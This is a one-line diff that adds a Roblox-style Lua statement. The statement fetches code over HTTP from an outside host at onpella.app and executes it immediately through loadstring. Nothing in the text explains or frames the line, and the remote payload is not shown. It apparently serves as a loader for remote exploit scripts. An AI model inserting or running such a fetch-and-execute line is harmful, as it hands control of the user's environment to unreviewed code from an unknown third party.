@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://olivinesilverfish.onpella.app/raw/4eef21f384d9538a"))()
